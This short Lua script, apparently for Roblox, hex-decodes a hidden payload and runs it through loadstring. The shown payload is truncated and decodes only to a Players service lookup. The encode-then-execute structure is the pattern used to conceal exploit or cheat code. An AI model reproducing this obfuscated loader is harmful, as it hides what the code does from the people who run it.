-- Script made by NghiaDz
local function _hex2str(h)
    return (h:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

local _payload = _hex2str([[
6c6f63616c20506c6179657273
203d2067616d65536572766963653a476574536572766963652822506c617965
... (g)
]])

-- Bruh
local ok, err = pcall(function()
    local f = loadstring(_payload)
    if f then f() end
end)
if not ok then
    warn("Error socho bulon:", err)
end
